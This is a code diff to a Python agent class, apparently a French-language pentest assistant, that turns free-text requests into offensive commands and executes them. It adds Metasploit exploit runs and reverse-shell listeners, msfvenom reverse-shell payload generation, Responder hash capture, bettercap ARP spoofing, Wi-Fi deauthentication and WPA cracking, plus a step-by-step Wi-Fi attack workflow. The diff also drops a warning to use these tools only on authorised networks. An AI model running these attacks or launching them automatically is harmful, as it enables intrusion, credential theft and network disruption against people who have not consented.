@@ -26,6 +26,8 @@ _TRIGGER_MAP = {
         "web", "http", "https", "répertoire", "directory", "fuzz",
         "sqlmap", "injection", "sql", "wpscan", "wordpress",
         "whatweb", "wafw00f", "vhost", "virtualhost",
+        "burp", "burpsuite", "proxy web", "intercepter requête",
+        "zap", "zaproxy", "owasp", "scanner web",
     ],
     "passwords": [
         "hydra", "medusa", "hashcat", "john", "brute", "bruteforce", "crack",
@@ -34,7 +36,7 @@ _TRIGGER_MAP = {
     ],
     "exploitation": [
         "exploit", "msfvenom", "payload", "reverse shell", "bind shell", "shellcode",
-        "metasploit", "msfconsole", "meterpreter", "searchsploit", "exploitdb",
+        "metasploit", "msfconsole", "msf", "meterpreter", "searchsploit", "exploitdb",
         "impacket", "secretsdump", "psexec", "wmiexec", "ntlmrelay",
     ],
     "reversing": [
@@ -55,13 +57,16 @@ _TRIGGER_MAP = {
     "network": [
         "tcpdump", "tshark", "wireshark", "capture",
         "responder", "ntlmv2", "llmnr", "nbt-ns",
-        "bettercap", "ettercap", "mitm", "arp spoofing",
+        "bettercap", "ettercap", "mitm", "arp spoofing", "arp-spoofing",
         "netcat", "nc", "socat", "ncat",
         "proxy", "proxychains",
     ],
     "wireless": [
-        "aircrack", "airodump", "aireplay", "airmon", "wifi", "wpa", "wpa2",
+        "aircrack", "aircrack-ng", "airodump", "airodump-ng",
+        "aireplay", "aireplay-ng", "airmon", "airmon-ng",
+        "wifi", "wpa", "wpa2", "wep",
         "handshake", "beacon", "essid", "bssid", "deauth",
+        "mode monitor", "monitor mode", "wlan",
     ],
     "forensics": [
         "volatility", "volatility3", "dump mémoire", "memory dump",
@@ -210,22 +215,46 @@ class CyberAgent(BaseAgent):
         return self._run_command(cmd, task)
 
     def _handle_web(self, task: str) -> dict:
+        t = task.lower()
+
+        # Burp Suite
+        if any(kw in t for kw in ["burp", "burpsuite"]):
+            return self._result(True,
+                "Burp Suite — proxy d'interception web :\n"
+                "  burpsuite          (lancement GUI)\n\n"
+                "Pour des scans automatiques en CLI, utiliser OWASP ZAP :\n"
+                "  zaproxy -cmd -quickurl http://<cible> -quickout /tmp/zap.html\n\n"
+                "API REST Burp (si activée sur port 1337) :\n"
+                "  curl -s 'http://localhost:1337/v0.1/scan' \\\n"
+                "       -d '{\"urls\":[\"http://<cible>\"]}'",
+                {"tool": "burpsuite"})
+
+        # OWASP ZAP
+        if any(kw in t for kw in ["zap", "zaproxy", "owasp"]):
+            target = self._extract_url_or_target(task)
+            if target:
+                if not target.startswith("http"):
+                    target = f"http://{target}"
+                cmd = f"zaproxy -cmd -quickurl {target} -quickout /tmp/zap_report.html"
+                return self._run_command(cmd, task)
+            return self._result(False, "Spécifie une URL. Ex: zaproxy http://10.0.0.1")
+
         target = self._extract_url_or_target(task)
         if not target:
             return self._result(False, "Spécifie une URL cible.",
                                 {"hint": "Ex: gobuster dir http://10.0.0.1 | nikto -h http://target"})
 
-        if "sqlmap" in task.lower():
+        if "sqlmap" in t:
             cmd = f"sqlmap -u '{target}' --dbs --batch"
-        elif any(kw in task.lower() for kw in ["nikto", "vuln", "vulnérabilité"]):
+        elif any(kw in t for kw in ["nikto", "vuln", "vulnérabilité"]):
             cmd = f"nikto -h {target}"
-        elif any(kw in task.lower() for kw in ["ffuf", "fuzz", "param"]):
+        elif any(kw in t for kw in ["ffuf", "fuzz", "param"]):
             wordlist = "/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt"
             url = target if "FUZZ" in target else f"{target}/FUZZ"
             cmd = f"ffuf -w {wordlist} -u {url} -mc 200,301,302,403"
-        elif any(kw in task.lower() for kw in ["wpscan", "wordpress", "wp"]):
+        elif any(kw in t for kw in ["wpscan", "wordpress", "wp"]):
             cmd = f"wpscan --url {target} --enumerate u,p,t"
-        elif any(kw in task.lower() for kw in ["whatweb", "fingerprint", "technologie"]):
+        elif any(kw in t for kw in ["whatweb", "fingerprint", "technologie"]):
             cmd = f"whatweb -a 3 {target}"
         else:
             wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
@@ -267,6 +296,42 @@ class CyberAgent(BaseAgent):
 
     def _handle_exploitation(self, task: str) -> dict:
         t = task.lower()
+        target = self._extract_target(task)
+
+        # Metasploit Framework — mode non-interactif
+        if any(kw in t for kw in ["metasploit", "msfconsole", "msf"]) and "msfvenom" not in t:
+            module_match = re.search(r"(exploit/[\w/]+|auxiliary/[\w/]+|post/[\w/]+)", task)
+            lhost = self._extract_ip(task) or "10.10.10.10"
+            lport = self._extract_port(task) or "4444"
+            rhosts = target or "10.0.0.1"
+
+            if module_match:
+                module = module_match.group(1)
+                msf_cmds = f"use {module}; set RHOSTS {rhosts}; set LHOST {lhost}; set LPORT {lport}; run; exit"
+                cmd = f"msfconsole -q -x '{msf_cmds}'"
+                return self._run_command(cmd, task)
+
+            # Listener reverse shell
+            if any(kw in t for kw in ["listener", "handler", "écoute", "reverse"]):
+                payload = "windows/x64/meterpreter/reverse_tcp" if any(kw in t for kw in ["windows", "win"]) else "linux/x64/shell_reverse_tcp"
+                msf_cmds = f"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run; exit"
+                cmd = f"msfconsole -q -x '{msf_cmds}'"
+                return self._run_command(cmd, task)
+
+            return self._result(True,
+                "Metasploit Framework — utilisation non-interactive :\n\n"
+                "  msfconsole -q -x 'use <MODULE>; set RHOSTS <IP>; set LHOST <IP>; run; exit'\n\n"
+                "Modules courants :\n"
+                "  exploit/multi/handler                      → Listener (reverse shell)\n"
+                "  exploit/windows/smb/ms17_010_eternalblue   → EternalBlue (MS17-010)\n"
+                "  exploit/unix/ftp/vsftpd_234_backdoor       → vsFTPd 2.3.4\n"
+                "  exploit/multi/samba/usermap_script         → Samba usermap\n"
+                "  auxiliary/scanner/smb/smb_version          → Scan version SMB\n"
+                "  auxiliary/scanner/ssh/ssh_login            → Brute force SSH\n"
+                "  auxiliary/scanner/portscan/tcp             → Scan de ports\n"
+                "  post/multi/recon/local_exploit_suggester   → Suggérer privesc\n\n"
+                "Précise le module ou l'action pour lancer directement.",
+                {"tool": "msfconsole"})
 
         if "msfvenom" in t or "payload" in t:
             lhost = self._extract_ip(task) or "10.10.10.10"
@@ -277,6 +342,10 @@ class CyberAgent(BaseAgent):
                 cmd = f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o /tmp/shell.php"
             elif any(kw in t for kw in ["python", "py"]):
                 cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f py -b '\\x00'"
+            elif any(kw in t for kw in ["aspx", "asp", "iis"]):
+                cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f aspx -o /tmp/shell.aspx"
+            elif any(kw in t for kw in ["jar", "java"]):
+                cmd = f"msfvenom -p java/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f jar -o /tmp/shell.jar"
             else:
                 cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/shell"
             return self._run_command(cmd, task)
@@ -293,7 +362,7 @@ class CyberAgent(BaseAgent):
                 "Ex: impacket-secretsdump domain/user:pass@target\n"
                 "Ex: impacket-psexec domain/user:pass@target")
 
-        return self._result(False, "Précise l'action d'exploitation (msfvenom/searchsploit/impacket).")
+        return self._result(False, "Précise l'action d'exploitation (metasploit/msfvenom/searchsploit/impacket).")
 
     def _handle_reversing(self, task: str) -> dict:
         t = task.lower()
@@ -357,10 +426,58 @@ class CyberAgent(BaseAgent):
         t = task.lower()
         target = self._extract_target(task)
 
+        # Responder — lancement direct si interface précisée
         if any(kw in t for kw in ["responder"]):
-            return self._result(False,
-                "Responder nécessite une interface réseau.\n"
-                "Ex: responder -I eth0 -rdwv\nAttention : à utiliser uniquement sur un réseau autorisé.")
+            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+|eno\d+|lo)\b", task)
+            if iface:
+                mode = "-rdwv" if any(kw in t for kw in ["verbose", "-v"]) else "-rdw"
+                cmd = f"responder -I {iface.group(0)} {mode}"
+                return self._run_command(cmd, task)
+            return self._result(True,
+                "Responder — capture de hashes NTLMv2 (LLMNR/NBT-NS poisoning) :\n"
+                "  responder -I eth0 -rdwv     (mode actif + verbose)\n"
+                "  responder -I eth0 -A         (mode analyse uniquement, sans poison)\n\n"
+                "Spécifie l'interface réseau pour lancer directement.\n"
+                "Hashes capturés dans /usr/share/responder/logs/",
+                {"tool": "responder"})
+
+        # Bettercap — MITM framework
+        if any(kw in t for kw in ["bettercap", "mitm", "arp spoofing", "arp-spoofing"]):
+            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+|eno\d+)\b", task)
+            if iface:
+                if any(kw in t for kw in ["arp", "spoofing", "mitm", "sniff"]):
+                    eval_cmds = "net.probe on; arp.spoof on; net.sniff on"
+                    cmd = f"bettercap -iface {iface.group(0)} -eval '{eval_cmds}'"
+                else:
+                    cmd = f"bettercap -iface {iface.group(0)}"
+                return self._run_command(cmd, task)
+            return self._result(True,
+                "Bettercap — framework MITM réseau :\n"
+                "  bettercap -iface eth0\n"
+                "  bettercap -iface eth0 -eval 'net.probe on; arp.spoof on; net.sniff on'\n"
+                "  bettercap -iface eth0 -caplet arp-spoofing.cap\n\n"
+                "Modules utiles en session interactive :\n"
+                "  net.probe on          → découverte hôtes\n"
+                "  arp.spoof on          → ARP poisoning\n"
+                "  net.sniff on          → sniffer trafic\n"
+                "  http.proxy on         → proxy HTTP\n"
+                "  https.proxy on        → proxy HTTPS (SSLstrip)\n\n"
+                "Spécifie l'interface réseau pour lancer directement.",
+                {"tool": "bettercap"})
+
+        # Wireshark / tshark
+        if any(kw in t for kw in ["wireshark", "tshark"]):
+            pcap = self._extract_file_path(task)
+            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+)\b", task)
+            if pcap and "tshark" in t:
+                cmd = f"tshark -r {pcap}"
+            elif iface and "tshark" in t:
+                cmd = f"tshark -i {iface.group(0)} -c 100"
+            elif pcap:
+                cmd = f"tshark -r {pcap} -Y 'http or dns or ftp'"
+            else:
+                cmd = f"tshark -i {iface.group(0) if iface else 'eth0'} -c 50"
+            return self._run_command(cmd, task)
 
         if any(kw in t for kw in ["tcpdump", "capture"]):
             iface = re.search(r"-i\s+(\w+)", task)
@@ -373,7 +490,7 @@ class CyberAgent(BaseAgent):
             cmd = f"nc -lvnp {port}"
             return self._run_command(cmd, task)
 
-        return self._result(False, "Précise l'action réseau (tcpdump/responder/netcat/socat).")
+        return self._result(False, "Précise l'action réseau (tcpdump/responder/bettercap/wireshark/netcat/socat).")
 
     def _handle_forensics(self, task: str) -> dict:
         t = task.lower()
@@ -398,11 +515,75 @@ class CyberAgent(BaseAgent):
         return self._result(False, "Précise l'outil forensics (volatility3/exiftool/binwalk/foremost).")
 
     def _handle_wireless(self, task: str) -> dict:
-        return self._result(False,
-            "Outils wireless disponibles : aircrack-ng, airodump-ng, aireplay-ng, airmon-ng\n"
-            "Ces commandes nécessitent une interface en mode monitor.\n"
-            "Donne la commande complète pour l'exécuter.",
-            {"tools": ["aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"]})
+        t = task.lower()
+        bssid_match = re.search(r"\b([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})\b", task)
+        iface_match = re.search(r"\b(wlan\d+(?:mon)?|mon\d+)\b", task)
+        iface = iface_match.group(0) if iface_match else "wlan0mon"
+
+        # airmon-ng — gestion mode monitor
+        if any(kw in t for kw in ["airmon", "monitor", "mode monitor", "monitor mode"]):
+            raw_iface = re.search(r"\b(wlan\d+)\b", task)
+            raw_iface = raw_iface.group(0) if raw_iface else "wlan0"
+            if any(kw in t for kw in ["stop", "désactiver", "disable"]):
+                cmd = f"airmon-ng stop {raw_iface}mon"
+            elif any(kw in t for kw in ["check", "tuer", "kill"]):
+                cmd = "airmon-ng check kill"
+            else:
+                cmd = f"airmon-ng start {raw_iface}"
+            return self._run_command(cmd, task)
+
+        # airodump-ng — capture et découverte
+        if any(kw in t for kw in ["airodump", "scanner wifi", "découvrir réseau", "capture wifi"]):
+            if bssid_match:
+                ch_match = re.search(r"(?:canal?|channel|-c)\s+(\d+)", t)
+                ch = ch_match.group(1) if ch_match else "6"
+                cmd = f"airodump-ng --bssid {bssid_match.group(0)} --channel {ch} --write /tmp/capture {iface}"
+            else:
+                cmd = f"airodump-ng {iface}"
+            return self._run_command(cmd, task)
+
+        # aireplay-ng — injection / deauth
+        if any(kw in t for kw in ["aireplay", "deauth", "déauthentification", "injection"]):
+            if not bssid_match:
+                return self._result(False,
+                    "Fournis le BSSID du point d'accès.\n"
+                    "Ex: aireplay-ng deauth 10 AA:BB:CC:DD:EE:FF wlan0mon")
+            count_match = re.search(r"\b(\d+)\b", t)
+            count = count_match.group(1) if count_match and int(count_match.group(1)) < 1000 else "10"
+            client_match = re.search(r"-c\s+([0-9a-fA-F:]{17})", task)
+            if client_match:
+                cmd = f"aireplay-ng --deauth {count} -a {bssid_match.group(0)} -c {client_match.group(1)} {iface}"
+            else:
+                cmd = f"aireplay-ng --deauth {count} -a {bssid_match.group(0)} {iface}"
+            return self._run_command(cmd, task)
+
+        # aircrack-ng — cracking handshake
+        if any(kw in t for kw in ["aircrack", "crack wifi", "casser wpa", "cracker", "handshake"]):
+            cap_file = self._extract_file_path(task) or "/tmp/capture-01.cap"
+            wordlist_match = re.search(r"(?:wordlist|dict|dictionnaire)\s+(\S+)", t)
+            wordlist = wordlist_match.group(1) if wordlist_match else "/usr/share/wordlists/rockyou.txt"
+            if bssid_match:
+                cmd = f"aircrack-ng -w {wordlist} -b {bssid_match.group(0)} {cap_file}"
+            else:
+                cmd = f"aircrack-ng -w {wordlist} {cap_file}"
+            return self._run_command(cmd, task)
+
+        # Guide complet workflow Wi-Fi
+        return self._result(True,
+            "Workflow complet attaque Wi-Fi WPA2 :\n\n"
+            "1. Préparer l'interface :\n"
+            "   airmon-ng check kill\n"
+            "   airmon-ng start wlan0         → crée wlan0mon\n\n"
+            "2. Scanner les réseaux :\n"
+            "   airodump-ng wlan0mon\n\n"
+            "3. Capturer le handshake :\n"
+            "   airodump-ng --bssid <BSSID> --channel <CH> --write /tmp/capture wlan0mon\n\n"
+            "4. Forcer le handshake (deauth) :\n"
+            "   aireplay-ng --deauth 10 -a <BSSID> wlan0mon\n\n"
+            "5. Cracker le handshake :\n"
+            "   aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap\n\n"
+            "Dis-moi quelle étape lancer et avec quel BSSID/interface.",
+            {"tools": ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]})
 
     def _handle_smb(self, task: str) -> dict:
         t = task.lower()
